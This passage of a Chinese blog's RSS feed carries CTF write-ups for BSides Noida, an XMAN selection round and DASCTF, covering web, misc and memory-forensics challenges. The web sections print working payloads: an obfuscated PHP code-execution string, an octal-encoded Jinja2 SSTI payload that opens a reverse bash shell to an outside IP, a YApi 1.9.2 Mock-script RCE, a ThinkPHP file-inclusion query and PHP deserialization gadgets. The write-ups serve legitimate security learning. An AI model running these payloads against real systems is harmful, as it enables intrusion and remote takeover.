函数仍然在，因此只需要利用 exec 去进行 RCE，chr 进行被禁用的字符生成即可。构造出如下载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=C,<span class="variable">$C</span>=((<span class="number">1</span>/<span class="number">0</span>).C)[<span class="number">2</span>],<span class="variable">$C</span>++,<span class="variable">$C</span>++,<span class="variable">$_</span>.=<span class="variable">$C</span>,<span class="variable">$_</span>.=([].C)[<span class="number">2</span>],<span class="variable">$C</span>=<span class="variable">$_</span>(<span class="number">70</span>-<span class="number">1</span>),(<span class="variable">$C</span>.<span class="variable">$_</span>(<span class="number">120</span>).<span class="variable">$C</span>.C)($&#123;_.<span class="variable">$_</span>(<span class="number">71</span>).<span class="variable">$C</span>.<span class="variable">$_</span>(<span class="number">84</span>)&#125;[_]);</span><br></pre></td></tr></table></figure><p>载荷将执行 GET 参数 _ 的值，因此将反弹 shell 放在 GET 参数 _ 中，再将载荷以 POST 参数 VietNam 提交即可达成目的。在 shell 中读取 /home/fl4g_h1hih1i_xxx.txt 即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;w0w_gr3at_Th4nk_y0u_f0r_j0in1ng_CTF_!!!!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Farewell"><a href="#Farewell" class="headerlink" title="Farewell"></a>Farewell</h3><blockquote><p>“You might be alone at the moment…<br>But someday… You’ll definitely find nakama!<br>No one is born in this world to be alone!”<br>― Eiichiro Oda</p></blockquote><p>拼图小游戏，在请求中可以找到原图，可以直接读出 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628504234060552/f5027eccc0e5926c867ad5cce52e6d632ebc7b34.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;Th4nk5_f0rpl4y1ng_See_y0u_n3xty34rBy3&#125;</span><br></pre></td></tr></table></figure><h3 id="Psst"><a href="#Psst" class="headerlink" title="Psst"></a>Psst</h3><blockquote><p>Psst! Want to know a secret? Here, take this…</p></blockquote><p>使用 gzip -d psst.tar.gz 和 tar -xf psst.tar 依次解压后写个脚本进行遍历。这里不能使用 Windows 来运行脚本，因为有文件夹的最后一个字符为 <code>.</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">message = <span class="string">&quot;&quot;</span></span><br><span class="line">path = <span class="string">&quot;./chall/Security&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    <span class="built_in">print</span>(files)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(files) == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>).read().strip()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;txt&quot;</span> <span class="keyword">in</span> files[<span class="number">0</span>]:</span><br><span class="line">        files.reverse()</span><br><span class="line">    message += <span class="string">f&quot;<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span> &quot;</span></span><br><span class="line">    flag += <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;files[<span class="number">1</span>]&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>).read().strip()</span><br><span class="line">    path += <span class="string">f&quot;/<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>运行脚本后可以得到一段话和 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSides is a community-based framework for organizing events and informing members of the public about information security. These events are already happening in major cities around the world! We are responsible for organizing an independent BSides event approved in Noida, India. It creates opportunities for people to be present and participate in an intimate environment that promotes collaboration. It is a lively event with discussions, demos, and participants&#39; interactions.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;d1d_y0u_u53_b45h_5cr1pt1ng_6f7220737461636b6f766572666c6f773f&#125;</span><br></pre></td></tr></table></figure><h3 id="My-Artwork"><a href="#My-Artwork" class="headerlink" title="My Artwork"></a>My Artwork</h3><blockquote><p>“You can create art and beauty with a computer.” - Steven Levy<br>So, I decided not to use MS Paint anymore and write code instead!<br>Hope you can see my art before the turtle runs away!<br>He’s pretty fast tbh!<br>PS: Put the flag in BSNoida{} wrapper.</p></blockquote><p>将附件下载下来，使用 FMSLogo 逐条指令执行即可得到通过绘画读出如下字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODE_IS_BEAUTY_BEAUTY_ISCODE</span><br></pre></td></tr></table></figure><p>按照提示将字符串包裹即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;CODE_IS_BEAUTY_BEAUTY_ISCODE&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/6b16e944.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>第五届 XMAN 选拔赛</title>
      <link>https://lemonprefect.cn/zh-CN/posts/7b00520f.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/7b00520f.html</guid>
      <pubDate>Fri, 06 Aug 2021 12:50:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h3&gt;&lt;p&gt;按照提示进行请求即可获得 flag。&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>按照提示进行请求即可获得 flag。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.71.236.172</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">b=2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you_are_great!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>题目给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;Hel&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;xctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;what?Really?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> XMAN;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察到有对 <code>valid</code> 方法的调用，因此尝试使用 FilesystemIterator 类列出目录下文件，再使用 SplFileObject 读取出 flag。构造出如下两段脚本生成载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// List directory</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> XMAN());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read flag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn/f1a4.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> XMAN());</span><br></pre></td></tr></table></figure><p>将生成的载荷作为 GET 参数 <code>xctf</code> 提交即可获得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;928erf51ab894a64f7865cf3c2128b34&#125;</span><br></pre></td></tr></table></figure><h3 id="easyssti"><a href="#easyssti" class="headerlink" title="easyssti"></a>easyssti</h3><blockquote><p><a href="https://www.anquanke.com/post/id/223895#:~:text=Web-,Normal%20ssti,-ban%E4%BA%86%E5%BE%88%E5%A4%9A">https://www.anquanke.com/post/id/223895#:~:text=Web-,Normal%20ssti,-ban%E4%BA%86%E5%BE%88%E5%A4%9A</a></p></blockquote><p>跟 2020 年的安洵杯的 Normal ssti 相似，也是 Jinja2 的模板注入。不同点在于很难拿到 getitem 方法，因此可以使用 values 方法将字典转化为数组再取值。使用八进制绕过，构造出如下载荷进行反弹 shell。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%print((lipsum|attr(&quot;__globals__&quot;)).values()[18].values()[134](&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\142\141\163\150\40\55\143\40\42\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\70\56\61\63\66\56\70\56\62\61\60\57\63\62\65\65\40\60\76\46\61\42\47\51\56\162\145\141\144\50\51&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>在靶机的根目录可以找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zPkb3tzUW8m0KuSfPoPqgSU37I4ui2hZ&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="try-all-volatility"><a href="#try-all-volatility" class="headerlink" title="try_all_volatility"></a>try_all_volatility</h3><blockquote><p>我从孙吉儿那里偷来数据，但他是个机灵鬼，竟然把flag藏到了自拍照里</p></blockquote><p>将文件解压后使用 Volatility 2 的 imageinfo 检测，可以得到如下如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;imgs&#x2F;mem)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0x713000L</span><br><span class="line">                          KDBG : 0x8054e2e0L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 3</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">                KPCR for CPU 1 : 0xbab40000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2021-06-18 02:13:15 UTC+0000</span><br><span class="line">     Image local date and time : 2021-06-18 10:13:15 +0800</span><br></pre></td></tr></table></figure><p>确定 profile 为 WinXPSP3x86 后可以使用 filescan 扫描到桌面有两个关键文件。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">0x0000000009aaf028      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\MISC\hint.txt</span><br><span class="line">0x000000000a283498      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\MISC\res.png</span><br></pre></td></tr></table></figure><p>将文本文档和图片提取出来，在 hint.txt 中可以得到如下提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youcangetsthfromcmd</span><br></pre></td></tr></table></figure><p>使用 cmdscan 功能可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: csrss.exe Pid: 600</span><br><span class="line">CommandHistory: 0x2e3a508 Application: cmd.exe Flags: Allocated, Reset</span><br><span class="line">CommandCount: 18 LastAdded: 17 LastDisplayed: 17</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x198</span><br><span class="line">Cmd #0 @ 0x55b548: cd C:\Documents and Settings\Administrator\??\MISC</span><br><span class="line">Cmd #1 @ 0x2dd7a20: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format --volume_format raw</span><br><span class="line">Cmd #2 @ 0x55b8a8: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format raw  --volume_format raw</span><br><span class="line">Cmd #3 @ 0x55b3f0: can you find this?</span><br><span class="line">Cmd #4 @ 0x5524b8: yes</span><br><span class="line">Cmd #5 @ 0x2e39400: please go on</span><br><span class="line">Cmd #6 @ 0x2e39a80: haha</span><br><span class="line">Cmd #7 @ 0x2e01170: flag is down</span><br><span class="line">Cmd #8 @ 0x2e02110: flag&#123;xixixixix_Llalala_leizeNiuBi&#125;</span><br><span class="line">Cmd #9 @ 0x2e02f60: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format raw  --volume_format raw</span><br><span class="line">Cmd #10 @ 0x2e3a130: waw</span><br><span class="line">Cmd #11 @ 0x2e3a1d8: jpg?????????????????????????????????????????????????</span><br><span class="line">Cmd #12 @ 0x2e3dd80: ?</span><br><span class="line">Cmd #13 @ 0x55b878: nonono it is png</span><br><span class="line">Cmd #14 @ 0x55c778: just check the pixel!</span><br><span class="line">Cmd #15 @ 0x55d1d8: !!!!!!!</span><br><span class="line">Cmd #16 @ 0x2e3a028: !!!!!!</span><br><span class="line">Cmd #17 @ 0x2dd7ad0: winpmem_v3.3.rc3.exe -dd -o memorydump.raw --format raw --volume_format raw</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: csrss.exe Pid: 600</span><br><span class="line">CommandHistory: 0x2e3ad88 Application: winpmem_v3.3.rc3.exe Flags: Allocated</span><br><span class="line">CommandCount: 0 LastAdded: -1 LastDisplayed: -1</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x624</span><br></pre></td></tr></table></figure><p>对图片使用 StegSolve 进行 B 通道下的 MSB 数据提取可以得到一个压缩包。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f88da837-3d50-4191-b2d6-8c0874735dfa/1628227223003208/fb88be86ff538bf5e307a88e601664e12f84be03.jpg"></p><p>将其保存出来后解压可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Waw!_Y0u_D1d!_it_^_^&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/7b00520f.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DASCTF July X CBCTF 4th</title>
      <link>https://lemonprefect.cn/zh-CN/posts/aa6ae99.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/aa6ae99.html</guid>
      <pubDate>Sat, 31 Jul 2021 16:22:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;ezrce&quot;&gt;&lt;a href=&quot;#ezrce&quot; class=&quot;headerlink&quot; title=&quot;ezrce&quot;&gt;&lt;/a&gt;ezrce&lt;/h3&gt;&lt;p&gt;题目给出的 YApi 环境是 1.9.2，搜索可知这个版本存在已知的 RCE 漏洞。添加一个 API，设置一个高级 Mock 脚本。&lt;/p&gt;
 &lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><p>题目给出的 YApi 环境是 1.9.2，搜索可知这个版本存在已知的 RCE 漏洞。添加一个 API，设置一个高级 Mock 脚本。</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> process = <span class="built_in">this</span>.constructor.constructor(<span class="string">&#x27;return process&#x27;</span>)()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /f*&quot;</span>).toString()</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1627798784656689/4623f9157e849515821906397d15fa00597eea23.png"></p><p>访问 API 的 Mock 地址即可获得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d747e97d-58b0-4316-8740-3970e028c864&#125;</span><br></pre></td></tr></table></figure><h3 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h3><blockquote><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a></p></blockquote><p>直接使用参考中的 payload 包含出 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;&#x2F;?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0d004dc0-dbaf-41b5-a2cc-e21c1a5be878&#125;</span><br></pre></td></tr></table></figure><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><blockquote><p>管理员曾访问过flag</p></blockquote><p>题目给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$cmd</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = escapeshellarg(<span class="variable">$cmd</span>);</span><br><span class="line">        system(<span class="string">&#x27;cat &#x27;</span> . <span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现存在文件读取，结合提示先访问一下 nginx 的配置文件 <code>/var/log/nginx/access.log</code>。可以发现存在如下访问记录。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td 